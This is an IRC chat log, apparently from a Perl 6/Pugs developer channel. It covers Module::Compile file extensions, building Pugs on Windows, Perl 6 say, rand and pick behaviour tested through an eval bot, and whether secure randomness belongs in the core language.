[16:16] <ingy> see if I release YAML with .pmc (as I intend) there will be hell to pay

[16:17] <ingy> TimToady: the .pm is regenerated (if you are in the author environment)

[16:17] <TimToady> that's what I mean by "self-modifying .pm"

[16:18] <TimToady> I'm not making a value judgement, just trying to unnerstann

[16:18] <ingy> but the .pm isn't affecting itself

[16:18] <TimToady> what triggers the recompile?

[16:18] <ingy> it's just templated output of .p

[16:19] <TimToady> what triggers the templated output?

[16:19] <ingy> s/templat/compil/ blah blah

[16:19] *** reZo_ joined
[16:20] <ingy> oh... the PERL5OPT=-MModule::Compile=-p (or whathaveyou) does something like put a coderef in @INC to load .p before .pm

[16:21] <integral> so you're wanting to replace the entirely non magical .pmc,  with deep scary magic?

[16:21] <ingy> integral: no. I want to replace the slightly magical .pmc with the completely accepted .pm

[16:21] <ingy> :)

[16:22] <integral> o_O.  Are there really people scared of .pmc's?

[16:22] <ingy> it's quite sane

[16:22] <TimToady> the main downside I see is that you're essentially defining .pm to be P5 only and inventing a new standard P6 extension

[16:22] <ingy> I think

[16:23] <ingy> TimToady: interesting point. I wasn't thinking in Perl6 terms at all

[16:24] <ingy> but I'm not thinking of getting rid of .pmc

[16:24] <ingy> the current stuff is fine.

[16:24] <kolibrie> I like being able to have a .pm file and run it under perl or pugs and just have it work - the .pmc is nice for that

[16:25] <ingy> I'm just giving an option of getting the same power of M::C but with a .pm output, so I can use it in "production" modules

[16:25] *** andara left
[16:25] <ingy> I don't even have to distribute the .p file

[16:26] <ingy> so you'll never know my code was generated

[16:26] <integral> ugh, please do.  It makes submitting patches much easier (if it's a CPAN module)

[16:26] <ingy> rather than hand coded

[16:26] <kolibrie> hmm, local-only might be okay

[16:28] <ingy> integral: I agree. just making the point

[16:28] <kolibrie> but that is true, sending patches back to the author would be less effective in that case

[16:30] <ingy> I can even see .p -> .pm -> .pmc

[16:30] <ingy> ven for perl6

[16:30] <ingy> e

[16:31] <ingy> where .p is something that generates Perl 6

[16:31] <ingy> :)

[16:31] <ingy> or maybe just has templated doc stuff

[16:32] <ingy> but first, breakfast

[16:34] <Juerd>  .p is for P*

[16:34] <Juerd> .push, .pull

[16:37] <TimToady> http://filext.com/alphalist.php?extstart=%5EP

[16:37] <lambdabot> Title: Alphabetic File Extension List

[16:49] *** chris2 joined
[16:50] <ingy> TimToady: in the shower I realized that one way to think of this is that (by convention or consensus) we use .p->.pm for P5 and .pm->.pmc for P6

[16:50] <ingy> I rather like that.

[16:50] <ingy> It keeps fear and loathing away from P5 curmudgeons and places it squarely in P6 where there is already plenty of it

[16:50] <ingy> it might even please Alias

[16:51] <ingy> doubtful... very doubtful

[16:53] <Juerd> Personally, I'm in favour of dropping .pm and .plx? altogether

[16:53] <Juerd> And I don't see any compelling reason to give executable files an extension that's different from modules

[16:56] <ingy> Juerd: I'm not following you

[16:56] <ingy> dropping .pm from what?

[16:56] <ingy> and what is .plx?

[16:56] *** [particle] joined
[16:57] <ingy> Juerd: actually hold on for one sec. I need to drop off. brb

[16:57] *** ingy joined
[17:00] <Juerd> Dropping use of .pm for Perl 6. Let .plx? and .pm be an indication of Perl 5

[17:00] <Juerd> .plx is an extension used for Perl scripts, like .pl. The book Beginning Perl suggests .plx

[17:05] <xinming> I'll suggest that we use .pl6 for perl 6 scripts, and .pl5 for perl 5 scripts, and .pl defaults to the "current" perl. :-)

[17:05] <xinming> since, we might also need pl7.. *_*

[17:06] <Patterner> and .pl4

[17:06] <[particle]> don't forget .pl1

[17:06] *** kanru joined
[17:06] *** fglock joined
[17:08] <xinming> well, for .pl1, I think It doesn't hurt for people add a switch on shabang-line. :-P eg.  -Mv1 -Mv2  ;-)

[17:08] <xinming> I don't think it hurt for people adding a switch on shabang-line.

[17:09] * xinming feels sorry for his poor English.

[17:09] <xinming> s/it hurt/it hurts/

[17:09] <xinming> ^^^^  <-- oops

[17:14] <TimToady> I think extensions are of far too limited bandwidth to adequately express version information, and would be good only for rough commentary, and not even good for that once people started relying on it.

[17:19] <Juerd> TimToady: I think of file extensions as inter user communication

[17:20] *** buu joined
[17:22] <TimToady> "inter user communication" === "commentary"

[17:27] *** gugod_ joined
[17:27] *** cm joined
[17:27] *** gugod_ is now known as gugod

[17:31] <ingy> Juerd: sorry, back

[17:32] <ingy> I agree with TimToady. File extensions are not a good intention serialiazation lanuage

[17:32] <ingy> and /me is not a good typist

[17:33] <Juerd> TimToady: Agreed

[17:33] <Juerd> ingy: So do I. But why try to attach *technical* meaning to them?

[17:33] <Juerd> That was nice in the DOS era :)

[17:34] <ingy> I'm not trying to attach any firm meaning to them

[17:35] <ingy> they don't really mean anything. I was just suggesting a standard practice for M::C

[17:36] <ingy> one that at least I would be interested in following.

[17:37] <ingy> for the millions not in the know, running into a .pmc in P5 CPAN distro is going to at least raise an eyebrow

[17:38] <ingy> but compiling to .pm, who let those millions be blissfully ignorant of ingy's evil coding practices

[17:38] <ingy> s/who/would/

[17:39] <ingy> P6 is evil by definition, so .pmc is par for the course

[17:40] *** stevan joined
[17:42] *** xinming joined
[17:43] *** larsen joined
[18:02] *** lanny joined
[18:05] *** buetow joined
[18:06] *** lanny joined
[18:07] *** buubot joined
[18:07] *** lanny joined
[18:09] *** elmex joined
[18:25] *** frederico joined
[18:27] <Limbic_Region> hello

[18:27] <Limbic_Region> @tell lanny I have Cygwin but do not use it for Pugs.  I use ActiveState Perl 5.8.8, MinGW, and GHC (binary install preferred)

[18:27] <lambdabot> Consider it noted.

[18:36] *** Gothmog_ joined
[18:37] *** cm_ joined
[18:38] *** penk joined
[18:45] <nothingmuch> does anybody want 1gb of ram (PC2700, laptop dimms) in two 512mb sticks?

[18:47] *** weinig joined
[18:47] <Limbic_Region> well, I am not sure it would be worth the trouble

[18:49] * Limbic_Region checks to verify his laptop can take the memory

[18:52] <Limbic_Region> nothingmuch - if no one else pipes up, I will be happy to take them though getting you the $ for shipping might not be so easy

[18:52] <nothingmuch> tell you what, you can buy me an amazon wishlist item

[18:52] <nothingmuch> if it makes you feel guilty

[18:57] <nothingmuch> Limbic_Region: fwiw lumi is also interested

[18:58] *** fglock joined
[18:58] <nothingmuch> maybe i can send a stick to each

[18:58] <Limbic_Region> nothingmuch - then I retract my interest

[18:58] <lumi> I think I could only take one stick..

[18:59] <nothingmuch> lumi: you have 1x 512 in your mac?

[18:59] <nothingmuch> audreyt++

[19:00] <lumi> Yes

[19:00] <nothingmuch> are we scheduled to meet sometime soon?

[19:00] <nothingmuch> if not i'll mail you the one stick

[19:00] <nothingmuch> Limbic_Region: 512 x 1 could still help, right?

[19:02] <nothingmuch> Limbic_Region: please @tell me when you've made up your mind (my connection is unstable so /msg might not get thorugh)... I'm off to a friend's house

[19:04] <Limbic_Region> @tell nothingmuch no, my memory has to be added in pairs but I really do appreciate it

[19:04] <lambdabot> Consider it noted.

[19:05] *** Gothmog_ joined
[19:05] <nothingmuch> if it has to be added in pairs it's probably not compatible

[19:05] <lambdabot> nothingmuch: You have 1 new message. '/msg lambdabot @messages' to read it.

[19:05] <nothingmuch> this type can be mixed and matched, IIRC

[19:05] <nothingmuch> *poof*

[19:12] *** explorer joined
[19:21] *** buubot joined
[19:56] *** lypanov joined
[19:59] *** penk joined
[19:59] *** justatheory joined
[20:06] <obra> seen audreyt

[20:06] <jabbot> obra: audreyt was seen 5 hours 3 minutes 36 seconds ago

[20:07] * Limbic_Region rubs his eyes to make sure he isn't seeing things

[20:07] <Limbic_Region> hey obra

[20:10] <obra> hey

[20:18] <ingy> hi obra

[20:19] <obra> hey ingy

[20:27] <lypanov> this makes me want to cry

[20:27] <lypanov> http://lukeplant.me.uk/blog.php?id=1107301645

[20:27] <lambdabot> Title: Why learning Haskell/Python makes you a worse programmer

[20:31] *** bpphillips left
[20:34] *** justatheory joined
[20:42] *** rindolf joined
[20:42] <rindolf> Hi all!

[20:42] <SamB> what!

[20:42] * SamB has to read this

[20:45] <lypanov> i agree partially, the thing that makes me want to cry is the idea that he thinks his functional c# solution is anywhere near as efficient as the horrible version

[20:46] * lypanov sighs

[20:48] <rindolf> Hi lypanov

[20:49] <lypanov> heya rindolf :)

[20:49] <rindolf> lypanov: what's up?

[20:49] <leo> 22:48 <@coke> ping obra

[20:49] <leo> 22:48 <@coke> Can we get purl back in here?

[20:49] <leo> # recently on #parrot

[20:50] <obra> hm. I'm not the keeper thereof

[20:50] <obra> but lemme see what I can do

[21:01] *** cm joined
[21:04] *** Limbic_Region joined
[21:23] *** anatolyv joined
[21:26] *** larsen joined
[21:31] *** weinig is now known as weinig|bbl

[21:33] *** lanny joined
[21:33] <lanny> Limbic_Region: ping

[21:33] <lambdabot> lanny: You have 1 new message. '/msg lambdabot @messages' to read it.

[21:33] <lanny> @messages

[21:33] <lambdabot> Limbic_Region said 3h 5m 39s ago: I have Cygwin but do not use it for Pugs. I use ActiveState Perl 5.8.8, MinGW, and GHC (binary install preferred)

[21:34] <rindolf> ingy: ping

[21:36] *** penk joined
[21:41] <ingy> hi rindolf

[21:46] <lypanov> omgitsalmost12night

[21:46] *** lypanov left
[21:47] <rindolf> Hi ingy

[21:47] <rindolf> ingy: did you upload IO::All yet?

[21:47] <ingy> not yet

[21:48] <rindolf> ingy: I see.

[21:48] <ingy> attempting it now

[21:52] <ingy> rindolf: found a mistake in META.yml

[21:52] <ingy> this is why I hate releasing modules (and don't trust it to others)

[21:52] <ingy> some day I'll fix this release process (again)

[21:55] <lanny> @tell audreyt Pugs::Doc::Hack refers to grabbing Bundle::Pugs::SmokeKit rather than Task::Smoke

[21:55] <lambdabot> Consider it noted.

[21:56] * ingy imagines rindolf executing a hostage for each day he fails to release IO::All

[21:59] <Limbic_Region> lanny - if you have any issues, please let me know

[22:02] <svnbot6> r14375 | lanny++ | * TASKS - remove "runpugs" as task and insert pugs/misc/runpugs/TODO

[22:02] *** dduncan joined
[22:03] <ingy> dang!

[22:04] <ingy> rindolf I just released IO::All

[22:04] <ingy> hope he isn't mad

[22:11] <clkao> ingy: rarr!

[22:15] <lanny> Anyone have any experience building pugs on win32 using MinGW and ActiveState?

[22:18] <lanny> @tell Limbic_Region Got MinGW, ActiveState, Subversion, pugs co.  Dieing on nmake to build.  It tries to use cmd.exe and chokes on a too-long command line.  Any suggestions?

[22:18] <lambdabot> Consider it noted.

[22:18] <[particle]> lanny: what version of nmake? the old ones (1.* have that problem)

[22:19] <lanny> Aha.  1.5

[22:19] <lanny> Seemed to come as part of Activestate Perl.  Where do I find a later?

[22:20] <[particle]> well, i have 7.10, which came with visual studio

[22:21] <[particle]> as far as i know, the only way to get a newer one is to download something like ms visual studio 2005 express and use that one

[22:21] <[particle]> i don't know if someone has packaged a recent nmake seperately

[22:21] <lanny> ewww

[22:21] <[particle]> like i said, i don't know. i haven't had to look for it, you see :)

[22:22] <Limbic_Region> lanny - you are using nmake 1.5

[22:22] <lambdabot> Limbic_Region: You have 1 new message. '/msg lambdabot @messages' to read it.

[22:22] <Limbic_Region> @messages

[22:22] <lambdabot> lanny said 4m 6s ago: Got MinGW, ActiveState, Subversion, pugs co. Dieing on nmake to build. It tries to use cmd.exe and chokes on a too-long command line. Any suggestions?

[22:22] <lanny> I am.  From Activestate

[22:22] <Limbic_Region> that wasn't a question, it was a statement

[22:22] <Limbic_Region> that's the problem

[22:22] <lanny> :)

[22:22] <Limbic_Region> hang on, will try and get you something more recent

[22:23] <Limbic_Region> do you have a feather acct?

[22:23] <lanny> I do

[22:23] <Limbic_Region> I will just put it in my home directory with all read access

[22:23] <[particle]> the old nmake distos were just two files

[22:23] <[particle]> nmake.exe and nmake.err

[22:23] <[particle]> perhaps that'll work with a recent one, too

[22:26] <Limbic_Region> lanny - done

[22:26] <Limbic_Region> see /home/limbic/nmake.exe

[22:26] <lanny> Limbic_Region++

[22:26] <lanny> [particle]++ for good measure

[22:26] <Limbic_Region> well, gaal++ too since that's who I got it from

[22:28] <Limbic_Region> [particle] - the executable is standalone so if you know someone who has gone through the trouble of getting it in the large bulky bundle

[22:28] <Limbic_Region> then you are all set

[22:28] <[particle]> great, you'll leave it there then?

[22:28] <Limbic_Region> yes

[22:29] <Limbic_Region> feel free to tell anyone with a feather acct where they can get it

[22:29] <Limbic_Region> but I won't be posting on the web where google can index it

[22:29] <Limbic_Region> likely frowned upon in general

[22:29] <[particle]> :)

[22:29] <[particle]> which version is it?

[22:30] <Limbic_Region> 7 something

[22:30] <Limbic_Region> just a sec

[22:30] <[particle]> great

[22:30] <Limbic_Region> 7.10.3077.0

[22:34] <lanny> Ok.  Can delete it.  Still having troubles with pscp but moved it to my ~

[22:36] <lanny> Odd.  MinGW doesn't want to run pscp but works fine in cmd.exe

[22:36] <Limbic_Region> what is the proper fu to get ls to print out times other than mtime ?

[22:37] <wolverian> --time=foo

[22:37] <wolverian> I'm not sure if you can make it print more than one time. hm.

[22:37] <wolverian> anyway, good night :)

[22:37] <Limbic_Region> thanks - TTFN

[22:37] <lanny> nmake++.  Working.

[22:37] <Limbic_Region> ;-)

[22:39] *** polettix joined
[22:52] *** weinig|bbl is now known as weinig

[23:02] *** anatolyv left
[23:06] <bsb> does a bare say or print still default to $_ these days?

[23:07] <[particle]> i think you need .say or .print but i'm not sure

[23:07] <bsb> that's what I thought (& pugs), but S04 has old style examples

[23:17] *** BooK joined
[23:20] <Limbic_Region> ?eval $_ = "blah"; say

[23:20] *** evalbot_r14373 is now known as evalbot_r14375

[23:20] <evalbot_r14375> OUTPUT[â¤] Bool::True

[23:20] <Limbic_Region> ?eval $_ = "blah"; .say

[23:20] <evalbot_r14375> OUTPUT[blahâ¤] Bool::True

[23:20] <TimToady> bsb: not anymore. :)

[23:20] <Limbic_Region> it appears pugs' say defaults to empty string though .say does the right thing

[23:21] <TimToady> (assuming my ci ever commits...)

[23:22] <TimToady> well, say by itself should probably just print a newline.

[23:22] <TimToady> and print by itself prints a null string...

[23:22] <TimToady> on the other hand, it's likely to be a common error.

[23:23] <TimToady> so for now we could certainly make print fail on 0 args, I expect.

[23:25] <bsb> syntactically, rather than something that evaluates to 0 args

[23:25] <TimToady> could even force people to use print "\n" to print newline instead of empty say.

[23:25] <TimToady> yeah, syn

[23:25] <TimToady> not sem

[23:25] <TimToady> OR we could just make the dwtm

[23:26] <TimToady> *them

[23:26] <TimToady> but I kinda like the .print discipline

[23:27] <TimToady> pity that .rand can't default to rand(1)

[23:27] <TimToady> well, not without setting $_ to 1...

[23:28] *** bsb left
[23:28] *** bsb joined
[23:28] <TimToady> on the other hand, picking a random int will probably end up with a different idiom: ^$max.pick or some such.

[23:29] <TimToady> hmm, that doesn't work

[23:29] <TimToady> would have to be (^$max).pick.  .ick.

[23:30] <TimToady> pick ^$max then

[23:30] <TimToady> pick 1..100

[23:32] *** jojo joined
[23:32] <TimToady> or we could do away with the optional argument to rand and use "int 3*rand"

[23:33] <jojo> 0|3*rand

[23:33] <TimToady> do you mean (0|3)*rand?

[23:33] <jojo> i mean 0| instead of int

[23:34] <TimToady> I you trying to do a bitwise or?

[23:34] <TimToady> *are you

[23:34] <jojo> bitwise or with 0 is noop, but the side effect is the same as int()

[23:35] <TimToady> but this is #perl6, so it'd have to be 0+|

[23:35] <jojo> ouch

[23:35] <TimToady> since bitwise or is now dehuffmanized to +| or ~| or ?|

[23:35] <TimToady> depending on whether you want numeric or stringwise or boolean.

[23:36] <TimToady> and | is stolen for junctions

[23:36] <TimToady> if $a == 1 | 2 | 3

[23:36] <TimToady> which will be a lot more common in P6 than bitops.

[23:36] <TimToady> given case statements look like:

[23:37] <TimToady> when 1 | 2 | 3  {...}

[23:38] <TimToady> anyway, int is a lot clearer, and that's usually better unless you're golfing it.

[23:38] <bsb> (I didn't know p5's ref defaulted to $_, how embarassing...)

[23:38] <lanny> ?eval say 5.rand()

[23:38] <evalbot_r14375> OUTPUT[4.305245104898988â¤] Bool::True

[23:38] <TimToady> ?eval say 5.rand.int

[23:38] <evalbot_r14375> OUTPUT[2â¤] Bool::True

[23:39] <jojo> thanks TimToady, that was very understanding

[23:40] <TimToady> ?eval pick ^5

[23:40] <evalbot_r14375> 1.0

[23:40] <TimToady> ?eval pick ^100

[23:40] <evalbot_r14375> 44.0

[23:41] <TimToady> p6's ref defaults to not existing.  :)

[23:42] <jojo> don't we need separate methods for repeatable rand and for secure rand?

[23:43] <TimToady> usually that's handled by srand.

[23:43] <TimToady> ?eval srand 42; pick ^100

[23:43] <evalbot_r14375> 71.0

[23:43] <TimToady> ?eval srand 42; pick ^100

[23:44] <evalbot_r14375> 71.0

[23:44] <jojo> when i strace perl5 srand it reads exactly 32bits from /dev/urandom

[23:44] <TimToady> well, there's secure, and then there's secure...

[23:44] <jojo> that is nowhere near enough to produce random session keys

[23:45] <lanny> Use some library for secure random.  rand() is pretty much an int.

[23:45] <lanny> Or open up /dev/u?random and read the number of bits you need.

[23:46] <TimToady> "/dev/urandom".slurp   :)

[23:46] <jojo> i know how to do it.  but i think it is becoming important enough that it ought to be better handled in the core language

[23:46] <lanny> heh.  Yeah but then you have to wave your mouse around.  Or is /dev/random the one with limited entropy?  Never can remember.

[23:47] <jojo> urandom is the non-blocking one, in linux

[23:47] <lanny> Why handle it in core when libraries work and then you can choose from so many implementations?

[23:48] <jojo> same argument as putting random in the kernel

[23:48] <lanny> I'm hoping that $*RANDGEN becomes the default random object.  Then anyone you wanted that did Rand could be installed.

[23:48] <jojo> even quite good programmers might not be able to tell good random generators from bad ones

[23:49] <TimToady> what you want is some kind of interface for requesting a random number generator that is good enough

[23:49] <jojo> so it is one thing arguably better done in core than in cpan

[23:49] <lanny> I would hope that even quite good programmers aren't trusting a random generator they don't *know* is good for secure apps though.

[23:50] <TimToady> we need CPUs with radium

[23:50] <lanny> And just because it's in core or kernel still doesn't mean it's known good.

[23:51] <jojo> radium, exactly, but then we need a path through the kernel into perl

[23:51] <TimToady> heck, just embed the radium directly into Perl...

[23:51] <jojo> otherwise you offer the programmer a choice between radium and x^y mod z

[23:52] <lanny> Well.  Pugs currently uses a linear congruential.

[23:53] <TimToady> false dichotomy if the kernel has any other timed connections to the real world.

[23:53] <lanny> Because it relies on Haskell

[23:53] <TimToady> since the real world is known to exhibit quantum indeterminacy from time to time.  :)

[23:53] <jojo> there are platforms where you can't trust the kernel

[23:53] <lanny> How random do you want, jojo?  Math::Random::Kiss passes all of DIEHARD and does Rand

[23:54] <jojo> but the kernel is the best place for random

[23:54] <clkao>  

[23:54] <TimToady> grr, monocultures...

[23:56] <TreyHarris> ?eval pick 33..77

[23:56] <evalbot_r14375> Error: pick not defined: VInt 33

[23:56] <TreyHarris> what's that mean?

[23:56] <lanny> ?eval pick: 33..77

[23:56] <evalbot_r14375> (33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77)

[23:56] <lanny> heh

[23:56] <jojo> actually, i have built a transistor-junction noise source, for connection to a soundcard

[23:56] <TreyHarris> ?eval pick (33..77)

[23:56] <evalbot_r14375> 41

[23:57] <jojo> and i am handling that totally in userland

[23:57] <TreyHarris> ?eval (pick 33)..77

[23:57] <evalbot_r14375> Error: pick not defined: VInt 33

[23:57] <TreyHarris> oh... that's equivalent to (pick 33)..77?

[23:57] <TreyHarris> that's... very unintuitive

[23:57] <TimToady> pick: goto pick;

[23:57] <jojo> but i really think most people will get better results from the kernel

[23:59] *** thepler joined
